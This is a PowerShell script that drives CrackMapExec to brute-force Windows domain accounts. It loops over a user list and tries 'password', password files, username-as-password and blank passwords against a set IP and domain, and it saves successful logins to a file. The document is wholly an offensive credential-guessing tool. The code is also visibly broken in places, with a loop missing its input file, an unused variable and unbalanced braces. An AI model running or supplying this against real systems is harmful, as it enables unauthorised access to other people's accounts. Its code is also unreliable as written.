<#

1) Set Variables

$global:target="172.16.0.10"
$global:domain="SECURE"
$global:userlist="users.txt"
#

$global:target="192.168.80.50"
$global:domain="INSECURE.local"
$global:userlist="users.txt"
#

2) run the script 

./brute_cme.ps1

#>

#$global:target=$args[0]


function run-cme {

# custom password list 
$passlist = "pass100.txt"


# add the date at stat and end just for timing 
date 
echo "" > cme_brute_cracked.txt


# password
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe -d $domain $target -u $user -p password 
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}

# pass5.txt
ForEach ($user in Get-Content ) {
.\crackmapexec.exe -d $domain  $target -u $user -p pass5.txt
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}  

# user = password 
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe -d $domain $target -u $user -p $user
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}  


# pass_blank.txt
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe -d $domain $target -u $user -p pass_blank.txt
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}  


}  



date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\cme_brute_cracked.txt
}

# Run 

#if ($target) { 
run-cme | Tee cme_brute.txt
#} else {
#Write-Host "USEAGE: " 
#Write-Host "	./cme-brute.ps1 [IP ADDRESS]" 
#Write-Host "" 
#Write-Host "" 
#}



